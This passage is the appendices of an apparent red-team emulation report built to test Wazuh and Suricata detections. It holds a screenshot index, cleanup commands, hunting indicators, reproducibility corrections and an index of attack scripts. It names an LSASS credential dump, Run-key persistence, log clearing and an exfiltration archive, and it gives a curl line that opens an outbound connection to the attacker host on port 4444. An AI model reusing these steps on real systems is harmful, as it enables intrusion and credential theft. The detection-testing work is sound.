| 3 | 2 Brute Force | `hackmd.io/_uploads/S1wGXj0Dfg.png` | `screenshots/stage2-bruteforce.png` |
| 4 | 3 Successful Access | `hackmd.io/_uploads/H1kimjADMx.png` | `screenshots/stage3-access.png` |
| 5 | 5 Discovery | `hackmd.io/_uploads/Byvden0DGe.png` | `screenshots/stage5-discovery.png` |
| 6 | 6 Payload Drop (1/3) | `hackmd.io/_uploads/ryHT4hRwze.png` | `screenshots/stage6-payload-1.png` |
| 7 | 6 Payload Drop (2/3) | `hackmd.io/_uploads/SJWGU3Avzl.png` | `screenshots/stage6-payload-2.png` |
| 8 | 6 Payload Drop (3/3) | `hackmd.io/_uploads/SJpRYnCDze.png` | `screenshots/stage6-payload-3.png` |
| 9 | 7 Persistence | `hackmd.io/_uploads/S1Y8phADfe.png` | `screenshots/stage7-persistence.png` |
| 10 | 8 Command and Control | `hackmd.io/_uploads/H1w00Wx_Gg.png` | `screenshots/stage8-c2.png` |
| 11 | 9 File Lifecycle | `hackmd.io/_uploads/S1moKGxdMe.png` | `screenshots/stage9-fim.png` |

Stages 4, 8b, 10 and 11 have no screenshots; their evidence is the raw alert or, for 8b and 11, nothing yet.

---

## Appendix B — Artifacts and Cleanup

Everything the emulation leaves behind, with the command that removes it.

| Artifact | Stage | Location | Cleanup |
|---|---|---|---|
| Registry value `UpdaterSvc` | 7 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdaterSvc /f` |
| EICAR files | 6, 9 | `C:\Users\LENOVO\Downloads\virustotaltest\` | Delete the files in the folder |
| LSASS memory dump (contains credential material) | 8b | `C:\Windows\Temp\lsass_test.dmp` | `del C:\Windows\Temp\lsass_test.dmp`, then confirm it is gone |
| Exfiltration archive | 11 | `C:\Windows\Temp\exfil_test.zip` | `del C:\Windows\Temp\exfil_test.zip` |
| Locked account `LENOVO` | 2, 3 | Windows local accounts | `net user lenovo /active:yes` |
| Cleared Security log | 10 | Windows Security log | Not recoverable on the host; the history remains in Wazuh |
| Received archive, packet capture, Hydra state | 0, 11 | Kali home directory | Delete `received_exfil.zip`, `full_chain_*.pcap`, `hydra.restore` |
| Listeners | 6, 8, 11 | Kali ports `8000`, `4444`, `4445` | Stop `http.server` and the `nc` listeners |

**Indicators for hunting this emulation:** Kali `192.168.60.135`; ports `8000`, `4444`, `4445`; Run value `UpdaterSvc`; `procdump.exe` accessing `lsass.exe`; Event `1102` on the endpoint.

---

## Appendix C — Reproducibility Notes

| Where | Issue | Correction |
|---|---|---|
| Stage 4 | The original sample used `-EncodingCommand`, which is not a valid PowerShell parameter | Use `-EncodedCommand`, as the captured log shows |
| Stage 5 | Typo `whoammi` | `whoami` |
| Stage 6 | The original command used `-0` (HTTP/1.0 switch) before the output path | Use `-o` to write the file |
| Stages 6 and 9 | File names differ (`eicar2.com` created, `eicar2.txt` deleted) | Use one set of names |
| Stage 3 | Expected logon type depends on the OpenSSH configuration | Record the logon type seen in the event |
| Stage 8 | Alternative trigger `curl http://192.168.60.135:4444` | Produces the same outbound connection to port `4444` |


---

## Appendix D — Raw Evidence Logs and Attack Scripts

Every alert referenced in Section 4 is committed as raw JSON under
[`threat-emulation/evidence-logs/`](../threat-emulation/evidence-logs/), and
every command run during the chain is committed as a runnable script under
[`threat-emulation/attack-scripts/`](../threat-emulation/attack-scripts/).
Each log file is plain JSON (one alert per file); its status (verified, condensed
excerpt, rule mismatch) is recorded in the index linked at the end of this appendix.

| Stage | Attack script(s) | Evidence log(s) |
|---|---|---|
| 0 Preparation | `00-preparation_kali.sh` | — |
| 1 Reconnaissance | `01-reconnaissance_kali.sh` | `stage01-pfsense-synburst.json` |
| 2 Brute Force | `02-bruteforce_kali.sh` | `stage02-suricata-ssh-bruteforce.json`, `stage02-windows-4625-failed-logon.json` |
| 3 Successful Access | `03-successful-access_kali.sh` | `stage03-windows-4740-account-locked.json`, `stage03-rule-100410-correlation-excerpt.json` |
| 4 Execution | `04-execution_windows.ps1` | `stage04-sysmon-encoded-powershell.json` |
| 5 Discovery | `05-discovery_windows.cmd` | `stage05-sysmon-net1-discovery.json` |
| 6 Payload Drop | `06-payload-drop_kali.sh`, `06-payload-drop_windows.cmd` | `stage06-suricata-eicar-download.json`, `stage06-virustotal-malicious-detected.json` |
| 7 Persistence | `07-persistence_windows.cmd` | `stage07-sysmon-registry-runkey.json` |
| 8 Command and Control | `08-command-control_kali.sh`, `08-command-control_windows.ps1` | `stage08-suricata-reverse-shell.json` |
| 8b Credential Access | `08b-credential-access_windows.cmd` | `stage08b-rule-100411-lsass-excerpt.json` |
| 9 File Lifecycle | `09-file-lifecycle_windows.ps1` | — (screenshot only, Figure 11) |
| 10 Anti-Forensics | `10-anti-forensics_windows.ps1` | `stage10-windows-1102-log-cleared.json`, `stage10-rule-100412-excerpt.json` |
| 11 Exfiltration | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` | — (not yet evidenced) |

Five further logs sit under `threat-emulation/evidence-logs/` as supplementary
baseline evidence, not tied to a specific chain stage: `baseline-pfsense-udp-allowed.json`,
`baseline-pfsense-icmp-mismatch.json`, `baseline-pfsense-synburst-example1.json`,
`baseline-pfsense-synburst-e2e.json`, `baseline-suricata-portscan.json`, and
`stage08-suricata-reverse-shell-baseline-test.json` (the first reverse-shell
rule test, run before the chain).

Each stage's evidence-log status (verified / condensed / mismatched) is
indexed in [`threat-emulation/evidence-logs/README.md`](../threat-emulation/evidence-logs/README.md).
